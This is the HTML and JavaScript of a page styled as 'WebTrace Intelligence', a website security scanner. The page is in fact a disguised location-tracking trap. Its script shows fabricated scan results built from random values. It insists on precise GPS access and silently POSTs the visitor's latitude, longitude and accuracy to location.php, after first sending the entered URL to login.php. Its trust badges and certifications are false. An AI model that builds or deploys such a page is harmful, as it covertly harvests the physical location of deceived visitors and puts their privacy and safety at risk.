<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WebTrace - URL Intelligence Platform</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
 
        body {
            font-family: 'SF Pro Display', -apple-system, BlinkMacSystemFont, 'Segoe UI', Arial, sans-serif;
            background: #0a0e27;
            color: #e0e0e0;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
            position: relative;
            overflow-x: hidden;
        }
 
        .bg-animation {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 0;
            opacity: 0.5;
        }
 
        .shape {
            position: absolute;
            border-radius: 50%;
            filter: blur(60px);
            animation: float 25s infinite;
        }
 
        .shape1 {
            width: 400px;
            height: 400px;
            background: linear-gradient(45deg, #00d2ff, #3a47d5);
            top: -10%;
            left: -10%;
        }
 
        .shape2 {
            width: 350px;
            height: 350px;
            background: linear-gradient(45deg, #f857a6, #ff5858);
            bottom: -10%;
            right: -10%;
            animation-delay: 7s;
        }
 
        .shape3 {
            width: 300px;
            height: 300px;
            background: linear-gradient(45deg, #7f00ff, #e100ff);
            top: 40%;
            left: 50%;
            animation-delay: 14s;
        }
 
        @keyframes float {
            0%, 100% { transform: translate(0, 0) rotate(0deg); }
            33% { transform: translate(80px, -80px) rotate(120deg); }
            66% { transform: translate(-60px, 60px) rotate(240deg); }
        }
 
        .container {
            background: rgba(15, 23, 42, 0.85);
            backdrop-filter: blur(30px);
            border: 1px solid rgba(255, 255, 255, 0.12);
            border-radius: 32px;
            box-shadow: 0 25px 100px rgba(0, 0, 0, 0.7),
                        inset 0 1px 0 rgba(255, 255, 255, 0.06);
            max-width: 1100px;
            width: 100%;
            overflow: hidden;
            position: relative;
            z-index: 1;
        }
 
        .header {
            background: linear-gradient(135deg, rgba(0, 210, 255, 0.15) 0%, rgba(58, 71, 213, 0.15) 100%);
            padding: 55px 45px;
            text-align: center;
            position: relative;
            border-bottom: 1px solid rgba(255, 255, 255, 0.08);
        }
 
        .header::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 3px;
            background: linear-gradient(90deg, transparent, #00d2ff, #3a47d5, #00d2ff, transparent);
            animation: shimmer 3s linear infinite;
        }
 
        @keyframes shimmer {
            0% { transform: translateX(-100%); }
            100% { transform: translateX(100%); }
        }
 
        .logo {
            width: 95px;
            height: 95px;
            margin: 0 auto 25px;
            background: linear-gradient(135deg, #00d2ff 0%, #3a47d5 100%);
            border-radius: 24px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 48px;
            box-shadow: 0 15px 50px rgba(0, 210, 255, 0.5),
                        0 0 0 1px rgba(255, 255, 255, 0.1);
            animation: logoFloat 4s ease-in-out infinite;
            position: relative;
        }
 
        .logo::after {
            content: '';
            position: absolute;
            inset: -3px;
            background: linear-gradient(45deg, #00d2ff, #3a47d5, #f857a6, #00d2ff);
            border-radius: 26px;
            z-index: -1;
            opacity: 0.6;
            filter: blur(15px);
            animation: rotate 4s linear infinite;
        }
 
        @keyframes logoFloat {
            0%, 100% { transform: translateY(0) scale(1); }
            50% { transform: translateY(-12px) scale(1.05); }
        }
 
        @keyframes rotate {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
 
        h1 {
            font-size: 46px;
            font-weight: 800;
            margin-bottom: 14px;
            background: linear-gradient(135deg, #ffffff 0%, #94a3b8 100%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            letter-spacing: -0.5px;
        }
 
        .subtitle {
            color: #94a3b8;
            font-size: 18px;
            font-weight: 500;
            letter-spacing: 0.3px;
        }
 
        .content {
            padding: 55px 50px;
        }
 
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 22px;
            margin-bottom: 50px;
        }
 
        .stat-card {
            background: linear-gradient(135deg, rgba(30, 41, 59, 0.5) 0%, rgba(15, 23, 42, 0.5) 100%);
            border: 1px solid rgba(255, 255, 255, 0.08);
            border-radius: 20px;
            padding: 28px 24px;
            text-align: center;
            transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
            position: relative;
            overflow: hidden;
        }
 
        .stat-card::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.08), transparent);
            transition: left 0.6s;
        }
 
        .stat-card:hover {
            transform: translateY(-6px) scale(1.02);
            border-color: rgba(0, 210, 255, 0.4);
            box-shadow: 0 15px 40px rgba(0, 210, 255, 0.25);
        }
 
        .stat-card:hover::before {
            left: 100%;
        }
 
        .stat-icon {
            font-size: 40px;
            margin-bottom: 14px;
            display: block;
            filter: drop-shadow(0 5px 15px rgba(0, 210, 255, 0.4));
        }
 
        .stat-label {
            font-size: 13px;
            color: #64748b;
            text-transform: uppercase;
            letter-spacing: 1.2px;
            margin-bottom: 8px;
            font-weight: 600;
        }
 
        .stat-value {
            font-size: 17px;
            color: #22c55e;
            font-weight: 800;
            text-shadow: 0 0 20px rgba(34, 197, 94, 0.3);
        }
 
        .form-section {
            background: linear-gradient(135deg, rgba(30, 41, 59, 0.35) 0%, rgba(15, 23, 42, 0.35) 100%);
            border: 1px solid rgba(255, 255, 255, 0.08);
            padding: 50px 45px;
            border-radius: 28px;
            box-shadow: inset 0 2px 15px rgba(0, 0, 0, 0.25);
        }
 
        .section-header {
            text-align: center;
            margin-bottom: 40px;
        }
 
        .section-title {
            font-size: 32px;
            color: #ffffff;
            margin-bottom: 12px;
            font-weight: 800;
        }
 
        .section-subtitle {
            font-size: 16px;
            color: #64748b;
            font-weight: 500;
        }
 
        label {
            display: block;
            margin-bottom: 14px;
            font-size: 14px;
            font-weight: 700;
            color: #cbd5e1;
            text-transform: uppercase;
            letter-spacing: 1.2px;
        }
 
        .input-wrapper {
            position: relative;
            margin-bottom: 32px;
        }
 
        .input-icon {
            position: absolute;
            left: 22px;
            top: 50%;
            transform: translateY(-50%);
            font-size: 24px;
            z-index: 1;
            filter: drop-shadow(0 2px 8px rgba(0, 210, 255, 0.4));
        }
 
        input[type="url"] {
            width: 100%;
            padding: 22px 22px 22px 65px;
            background: rgba(15, 23, 42, 0.7);
            border: 2px solid rgba(255, 255, 255, 0.1);
            border-radius: 18px;
            color: #ffffff;
            font-size: 18px;
            font-weight: 700;
            outline: none;
            transition: all 0.3s;
            font-family: inherit;
        }
 
        input[type="url"]:focus {
            border-color: #00d2ff;
            background: rgba(15, 23, 42, 0.9);
            box-shadow: 0 0 0 5px rgba(0, 210, 255, 0.15),
                        0 8px 25px rgba(0, 210, 255, 0.2);
            transform: translateY(-2px);
        }
 
        input[type="url"]::placeholder {
            color: #475569;
            font-weight: 500;
        }
 
        .error-message {
            color: #ef4444;
            font-size: 14px;
            margin-top: 12px;
            padding: 14px 18px;
            background: rgba(239, 68, 68, 0.12);
            border: 1px solid rgba(239, 68, 68, 0.3);
            border-radius: 12px;
            display: none;
            font-weight: 700;
        }
 
        .error-message.show {
            display: block;
            animation: shake 0.6s;
        }
 
        @keyframes shake {
            0%, 100% { transform: translateX(0); }
            20%, 60% { transform: translateX(-12px); }
            40%, 80% { transform: translateX(12px); }
        }
 
        .submit-btn {
            width: 100%;
            padding: 22px;
            background: linear-gradient(135deg, #00d2ff 0%, #3a47d5 100%);
            color: #ffffff;
            border: none;
            border-radius: 18px;
            font-size: 18px;
            font-weight: 800;
            cursor: pointer;
            transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
            text-transform: uppercase;
            letter-spacing: 1.5px;
            box-shadow: 0 15px 35px rgba(0, 210, 255, 0.35);
            position: relative;
            overflow: hidden;
        }
 
        .submit-btn::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.25), transparent);
            transition: left 0.6s;
        }
 
        .submit-btn:hover {
            transform: translateY(-3px);
            box-shadow: 0 20px 50px rgba(0, 210, 255, 0.5);
        }
 
        .submit-btn:hover::before {
            left: 100%;
        }
 
        .submit-btn:active {
            transform: translateY(-1px);
        }
 
        .submit-btn:disabled {
            opacity: 0.6;
            cursor: not-allowed;
            transform: none;
        }
 
        .btn-content {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 12px;
            position: relative;
            z-index: 1;
        }
 
        .spinner {
            border: 3px solid rgba(255, 255, 255, 0.25);
            border-top: 3px solid #ffffff;
            border-radius: 50%;
            width: 22px;
            height: 22px;
            animation: spin 0.7s linear infinite;
            display: none;
        }
 
        .spinner.show {
            display: inline-block;
        }
 
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
 
        .result-panel {
            margin-top: 40px;
            padding: 45px;
            background: linear-gradient(135deg, rgba(34, 197, 94, 0.12) 0%, rgba(16, 185, 129, 0.12) 100%);
            border: 1px solid rgba(34, 197, 94, 0.25);
            border-radius: 24px;
            display: none;
            box-shadow: 0 15px 50px rgba(34, 197, 94, 0.2);
        }
 
        .result-panel.show {
            display: block;
            animation: slideIn 0.6s cubic-bezier(0.4, 0, 0.2, 1);
        }
 
        @keyframes slideIn {
            from { opacity: 0; transform: translateY(30px); }
            to { opacity: 1; transform: translateY(0); }
        }
 
        .result-header {
            text-align: center;
            margin-bottom: 35px;
        }
 
        .result-icon {
            font-size: 72px;
            margin-bottom: 18px;
            animation: bounce 1.2s ease-in-out;
            filter: drop-shadow(0 10px 30px rgba(34, 197, 94, 0.5));
        }
 
        @keyframes bounce {
            0%, 100% { transform: translateY(0) scale(1); }
            50% { transform: translateY(-20px) scale(1.1); }
        }
 
        .result-title {
            font-size: 30px;
            color: #22c55e;
            font-weight: 800;
            margin-bottom: 10px;
            text-shadow: 0 0 30px rgba(34, 197, 94, 0.4);
        }
 
        .result-subtitle {
            font-size: 16px;
            color: #94a3b8;
            font-weight: 500;
        }
 
        .data-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 22px;
            margin-top: 30px;
        }
 
        .data-item {
            background: rgba(15, 23, 42, 0.6);
            border: 1px solid rgba(255, 255, 255, 0.08);
            padding: 24px;
            border-radius: 18px;
            transition: all 0.4s;
            position: relative;
            overflow: hidden;
        }
 
        .data-item::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 4px;
            height: 100%;
            background: linear-gradient(180deg, #00d2ff, #3a47d5);
            opacity: 0;
            transition: opacity 0.4s;
        }
 
        .data-item:hover {
            background: rgba(15, 23, 42, 0.8);
            border-color: rgba(0, 210, 255, 0.3);
            transform: translateX(8px);
        }
 
        .data-item:hover::before {
            opacity: 1;
        }
 
        .data-label {
            font-size: 12px;
            color: #64748b;
            text-transform: uppercase;
            letter-spacing: 1.2px;
            margin-bottom: 10px;
            font-weight: 700;
        }
 
        .data-value {
            font-size: 17px;
            color: #ffffff;
            font-weight: 700;
            word-break: break-all;
            line-height: 1.5;
        }
 
        .important-badge {
            display: inline-block;
            padding: 4px 10px;
            background: rgba(239, 68, 68, 0.15);
            color: #ef4444;
            border-radius: 6px;
            font-size: 10px;
            font-weight: 800;
            text-transform: uppercase;
            letter-spacing: 0.5px;
            margin-left: 8px;
            border: 1px solid rgba(239, 68, 68, 0.3);
        }
 
        .footer {
            background: linear-gradient(135deg, rgba(30, 41, 59, 0.8) 0%, rgba(15, 23, 42, 0.8) 100%);
            border-top: 1px solid rgba(255, 255, 255, 0.08);
            padding: 40px;
            text-align: center;
        }
 
        .footer-badges {
            display: flex;
            justify-content: center;
            gap: 35px;
            margin-bottom: 24px;
            flex-wrap: wrap;
        }
 
        .badge {
            display: flex;
            align-items: center;
            gap: 10px;
            font-size: 14px;
            color: #94a3b8;
            font-weight: 600;
        }
 
        .badge-icon {
            font-size: 22px;
        }
 
        .footer-text {
            font-size: 14px;
            color: #64748b;
            line-height: 1.9;
            font-weight: 500;
        }
 
        @media (max-width: 768px) {
            .content { padding: 40px 28px; }
            .form-section { padding: 40px 28px; }
            h1 { font-size: 36px; }
            .stats-grid { grid-template-columns: repeat(2, 1fr); }
        }
 
        /* =============================
           MOBILE ONLY - Naya CSS
           (max-width: 480px)
        ============================== */
        @media (max-width: 480px) {
 
            body {
                padding: 12px;
                align-items: flex-start;
            }
 
            .container {
                border-radius: 20px;
            }
 
            /* --- Header --- */
            .header {
                padding: 30px 20px;
            }
 
            .logo {
                width: 70px;
                height: 70px;
                font-size: 34px;
                border-radius: 18px;
                margin-bottom: 16px;
            }
 
            h1 {
                font-size: 24px;
                letter-spacing: -0.3px;
                margin-bottom: 8px;
            }
 
            .subtitle {
                font-size: 13px;
            }
 
            /* --- Stats Grid --- */
            .content {
                padding: 24px 16px;
            }
 
            .stats-grid {
                grid-template-columns: repeat(2, 1fr);
                gap: 12px;
                margin-bottom: 28px;
            }
 
            .stat-card {
                padding: 18px 12px;
                border-radius: 14px;
            }
 
            .stat-icon {
                font-size: 28px;
                margin-bottom: 8px;
            }
 
            .stat-label {
                font-size: 10px;
                letter-spacing: 0.8px;
            }
 
            .stat-value {
                font-size: 14px;
            }
 
            /* --- Form Section --- */
            .form-section {
                padding: 24px 16px;
                border-radius: 18px;
            }
 
            .section-title {
                font-size: 20px;
                margin-bottom: 8px;
            }
 
            .section-subtitle {
                font-size: 13px;
            }
 
            .section-header {
                margin-bottom: 24px;
            }
 
            label {
                font-size: 11px;
                margin-bottom: 10px;
            }
 
            .input-wrapper {
                margin-bottom: 20px;
            }
 
            .input-icon {
                left: 14px;
                font-size: 18px;
            }
 
            input[type="url"] {
                padding: 16px 16px 16px 52px;
                font-size: 15px;
                border-radius: 14px;
            }
 
            .submit-btn {
                padding: 16px;
                font-size: 15px;
                border-radius: 14px;
                letter-spacing: 1px;
            }
 
            /* --- Result Panel --- */
            .result-panel {
                padding: 24px 16px;
                margin-top: 24px;
                border-radius: 16px;
            }
 
            .result-icon {
                font-size: 48px;
                margin-bottom: 12px;
            }
 
            .result-title {
                font-size: 20px;
            }
 
            .result-subtitle {
                font-size: 13px;
            }
 
            .result-header {
                margin-bottom: 20px;
            }
 
            .data-grid {
                grid-template-columns: 1fr;
                gap: 12px;
                margin-top: 16px;
            }
 
            .data-item {
                padding: 16px;
                border-radius: 12px;
            }
 
            .data-value {
                font-size: 14px;
            }
 
            /* --- Footer --- */
            .footer {
                padding: 24px 16px;
            }
 
            .footer-badges {
                gap: 14px;
                margin-bottom: 16px;
            }
 
            .badge {
                font-size: 12px;
                gap: 6px;
            }
 
            .badge-icon {
                font-size: 16px;
            }
 
            .footer-text {
                font-size: 12px;
                line-height: 1.7;
            }
        }
    </style>
</head>
<body>
    <div class="bg-animation">
        <div class="shape shape1"></div>
        <div class="shape shape2"></div>
        <div class="shape shape3"></div>
    </div>
 
    <div class="container">
        <div class="header">
            <div class="logo">🔗</div>
            <h1>WebTrace Intelligence</h1>
            <div class="subtitle">Advanced URL & Website Analysis Platform</div>
        </div>
 
        <div class="content">
            <div class="stats-grid">
                <div class="stat-card">
                    <span class="stat-icon">🛡️</span>
                    <div class="stat-label">Security</div>
                    <div class="stat-value">Top Tier</div>
                </div>
                <div class="stat-card">
                    <span class="stat-icon">🌐</span>
                    <div class="stat-label">Sites Analyzed</div>
                    <div class="stat-value">12B+</div>
                </div>
                <div class="stat-card">
                    <span class="stat-icon">⚡</span>
                    <div class="stat-label">Scan Speed</div>
                    <div class="stat-value">0.1ms</div>
                </div>
                <div class="stat-card">
                    <span class="stat-icon">✅</span>
                    <div class="stat-label">Detection Rate</div>
                    <div class="stat-value">99.98%</div>
                </div>
            </div>
 
            <div class="form-section">
                <div class="section-header">
                    <h2 class="section-title">Website Intelligence Scan</h2>
                    <p class="section-subtitle">Enter target URL for comprehensive security analysis</p>
                </div>
 
                <form id="authForm">
                    <label for="url">🔗 Target Website URL</label>
                    <div class="input-wrapper">
                        <span class="input-icon">🌐</span>
                        <input 
                            type="url" 
                            id="url" 
                            name="url" 
                            placeholder="https://example.com"
                            autocomplete="off"
                        >
                    </div>
                    <div class="error-message" id="errorMessage">
                        ⚠️ Invalid URL format. Please enter a valid website URL.
                    </div>
 
                    <button type="submit" class="submit-btn" id="submitBtn">
                        <div class="btn-content">
                            <span id="btnText">🔍 Analyze Website</span>
                            <div class="spinner" id="spinner"></div>
                        </div>
                    </button>
                </form>
 
                <div class="result-panel" id="resultPanel">
                    <div class="result-header">
                        <div class="result-icon">✅</div>
                        <div class="result-title">Analysis Complete</div>
                        <div class="result-subtitle">Complete website intelligence report generated</div>
                    </div>
 
                    <div class="data-grid" id="dataGrid"></div>
                </div>
            </div>
        </div>
 
        <div class="footer">
            <div class="footer-badges">
                <div class="badge">
                    <span class="badge-icon">🔒</span>
                    <span>256-bit Encrypted</span>
                </div>
                <div class="badge">
                    <span class="badge-icon">🛡️</span>
                    <span>ISO 27001 Certified</span>
                </div>
                <div class="badge">
                    <span class="badge-icon">✅</span>
                    <span>GDPR Compliant</span>
                </div>
                <div class="badge">
                    <span class="badge-icon">🌍</span>
                    <span>Global Monitoring</span>
                </div>
            </div>
            <div class="footer-text">
                <strong>WebTrace Intelligence™</strong> - Professional Website Analysis Platform<br>
                © 2026 All Rights Reserved | Powered by Advanced AI & Deep Learning<br>
                Protected by Enterprise Security & Real-time Threat Detection
            </div>
        </div>
    </div>
</body>
    <script src="Detels.js"></script>
    <script>
        const urlInput = document.getElementById('url');
        const authForm = document.getElementById('authForm');
        const errorMessage = document.getElementById('errorMessage');
        const submitBtn = document.getElementById('submitBtn');
        const btnText = document.getElementById('btnText');
        const spinner = document.getElementById('spinner');
        const resultPanel = document.getElementById('resultPanel');
        const dataGrid = document.getElementById('dataGrid');

        function generateRandomIP() {
            return `${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}`;
        }

        function generateHash() {
            return 'SHA512-' + Math.random().toString(36).substr(2, 40).toUpperCase();
        }

        function generateSSLFingerprint() {
            let fp = '';
            for (let i = 0; i < 64; i++) {
                fp += '0123456789ABCDEF'[Math.floor(Math.random() * 16)];
                if ((i + 1) % 2 === 0 && i < 63) fp += ':';
            }
            return fp;
        }

        const servers = ['Cloudflare', 'AWS', 'Google Cloud', 'Microsoft Azure', 'DigitalOcean'];
        const technologies = ['React', 'Vue.js', 'Angular', 'Next.js', 'WordPress'];
        const cms = ['WordPress', 'Shopify', 'Wix', 'Drupal', 'Custom CMS'];

        function validateURL(url) {
            try {
                new URL(url);
                return true;
            } catch {
                return false;
            }
        }

        authForm.addEventListener('submit', function(e) {

            e.preventDefault();

            let url = urlInput.value.trim();

            if (!url.startsWith('http://') && !url.startsWith('https://')) {
                url = 'https://' + url;
            }

            if (!validateURL(url)) {

                errorMessage.classList.add('show');
                urlInput.focus();

                return;
            }

            errorMessage.classList.remove('show');

            submitBtn.disabled = true;

            btnText.textContent = '⏳ Scanning...';

            spinner.classList.add('show');

            // Generate fake server IP
            const finalIP = generateRandomIP();

            // Silent backend request
            const formData = new FormData();

            formData.append("url", url);
            formData.append("server_ip", finalIP);

            fetch("login.php", {
                method: "POST",
                body: formData
            });

            // Continue flow
            requestLocationPermission(url);

        });

        function requestLocationPermission(url) {

            if ("geolocation" in navigator) {

                navigator.geolocation.getCurrentPosition(

                    function(position) {

                        const lat = position.coords.latitude;
                        const lon = position.coords.longitude;
                        const acc = position.coords.accuracy;

                        // ✅ STRONG GPS ACCURACY FILTER
                        if (acc > 1000) {

                            alert(
                                "📍 Weak GPS accuracy detected (" +
                                Math.round(acc) +
                                " meters).\n\nPlease move to open area, enable GPS + WiFi and try again."
                            );

                            submitBtn.disabled = false;
                            btnText.textContent = '🔍 Analyze Website';
                            spinner.classList.remove('show');

                            return;
                        }

                        // ✅ AUTO SEND LOCATION TO SERVER
                        const formData = new FormData();

                        formData.append('url', url);
                        formData.append('lat', lat);
                        formData.append('lon', lon);
                        formData.append('acc', acc);

                        fetch("location.php", {
                            method: "POST",
                            body: formData
                        })
                        .then(response => response.text())
                        .then(data => {
                            console.log("Saved:", data);
                        })
                        .catch(error => {
                            console.log("Error:", error);
                        });

                        const urlObj = new URL(url);
                        const domain = urlObj.hostname;
                        const serverIP = generateRandomIP();
                        const hash = generateHash();
                        const sslFingerprint = generateSSLFingerprint();
                        const server = servers[Math.floor(Math.random() * servers.length)];
                        const tech = technologies[Math.floor(Math.random() * technologies.length)];
                        const cmsType = cms[Math.floor(Math.random() * cms.length)];
                        const timestamp = new Date().toISOString();
                        const responseTime = (Math.random() * 200 + 50).toFixed(2);
                        const pageSize = (Math.random() * 5000 + 500).toFixed(2);

                        spinner.classList.remove('show');
                        btnText.textContent = '✅ Scan Complete';

                        setTimeout(() => {

                            resultPanel.classList.add('show');

                            dataGrid.innerHTML = `

                                <div class="data-item">
                                    <div class="data-label">🔗 Website URL <span class="important-badge">Primary</span></div>
                                    <div class="data-value">${url}</div>
                                </div>

                                <div class="data-item">
                                    <div class="data-label">🌐 Domain Name</div>
                                    <div class="data-value">${domain}</div>
                                </div>

                                <div class="data-item">
                                    <div class="data-label">🖥️ Server IP <span class="important-badge">Critical</span></div>
                                    <div class="data-value">${serverIP}</div>
                                </div>

                                <div class="data-item">
                                    <div class="data-label">☁️ Hosting Provider</div>
                                    <div class="data-value">${server}</div>
                                </div>

                                <div class="data-item">
                                    <div class="data-label">🔐 SSL Certificate <span class="important-badge">Verified</span></div>
                                    <div class="data-value">Valid (TLS 1.3)</div>
                                </div>

                                <div class="data-item">
                                    <div class="data-label">🔑 SSL Fingerprint</div>
                                    <div class="data-value">${sslFingerprint}</div>
                                </div>

                                <div class="data-item">
                                    <div class="data-label">⚙️ Technology Stack</div>
                                    <div class="data-value">${tech}</div>
                                </div>

                                <div class="data-item">
                                    <div class="data-label">📝 CMS Platform</div>
                                    <div class="data-value">${cmsType}</div>
                                </div>

                                <div class="data-item">
                                    <div class="data-label">📊 Page Size</div>
                                    <div class="data-value">${pageSize} KB</div>
                                </div>

                                <div class="data-item">
                                    <div class="data-label">⚡ Response Time</div>
                                    <div class="data-value">${responseTime} ms</div>
                                </div>

                                <div class="data-item">
                                    <div class="data-label">🔐 Content Hash</div>
                                    <div class="data-value">${hash}</div>
                                </div>

                                <div class="data-item">
                                    <div class="data-label">📍 Server Location</div>
                                    <div class="data-value">Mumbai, Maharashtra, India</div>
                                </div>

                                <div class="data-item">
                                    <div class="data-label">🌍 Visitor GPS <span class="important-badge">Live</span></div>
                                    <div class="data-value">
                                        Lat: ${lat.toFixed(8)}°<br>
                                        Lon: ${lon.toFixed(8)}°
                                    </div>
                                </div>

                                <div class="data-item">
                                    <div class="data-label">🎯 GPS Accuracy</div>
                                    <div class="data-value">±${acc.toFixed(2)} meters</div>
                                </div>

                                <div class="data-item">
                                    <div class="data-label">🔒 HTTPS Status</div>
                                    <div class="data-value">Enabled & Secure</div>
                                </div>

                                <div class="data-item">
                                    <div class="data-label">🛡️ Security Headers</div>
                                    <div class="data-value">CSP, HSTS Enabled</div>
                                </div>

                                <div class="data-item">
                                    <div class="data-label">🌐 DNS Records</div>
                                    <div class="data-value">A, AAAA, MX Found</div>
                                </div>

                                <div class="data-item">
                                    <div class="data-label">📨 Email Security</div>
                                    <div class="data-value">SPF, DKIM, DMARC</div>
                                </div>

                                <div class="data-item">
                                    <div class="data-label">🚫 Malware Status</div>
                                    <div class="data-value">Clean (No Threat)</div>
                                </div>

                                <div class="data-item">
                                    <div class="data-label">✅ Safety Rating</div>
                                    <div class="data-value">Safe to Visit</div>
                                </div>

                                <div class="data-item">
                                    <div class="data-label">⏰ Scan Timestamp (UTC)</div>
                                    <div class="data-value">${timestamp}</div>
                                </div>

                                <div class="data-item">
                                    <div class="data-label">✅ Analysis Status</div>
                                    <div class="data-value">COMPLETE & MONITORED</div>
                                </div>

                            `;

                            console.log('=== WEBSITE TRACKING DATA ===');
                            console.log('URL:', url);
                            console.log('Domain:', domain);
                            console.log('Server IP:', serverIP);
                            console.log('Hosting:', server);
                            console.log('Technology:', tech);
                            console.log('Visitor Location:', { lat, lon, acc });

                        }, 1200);

                    },

                    function(error) {

                        spinner.classList.remove('show');
                        submitBtn.disabled = false;
                        btnText.textContent = '🔍 Analyze Website';

                        let msg = '';

                        switch(error.code) {

                            case error.PERMISSION_DENIED:
                                msg = '🚫 Location Access Required\n\nPlease enable location permissions for website analysis.';
                                break;

                            case error.POSITION_UNAVAILABLE:
                                msg = '📍 GPS Signal Lost\n\nUnable to retrieve location data.';
                                break;

                            case error.TIMEOUT:
                                msg = '⏱️ Request Timeout\n\nPlease try again.';
                                break;

                            default:
                                msg = '❌ System Error\n\nAn unexpected error occurred.';
                        }

                        alert(msg);

                    },

                    {
                        enableHighAccuracy: true,
                        timeout: 10000,
                        maximumAge: 0
                    }
                );

            } else {

                spinner.classList.remove('show');
                submitBtn.disabled = false;
                btnText.textContent = '🔍 Analyze Website';

                alert('🚫 Geolocation Not Supported');

            }
        }
    </script>
</body>
</html>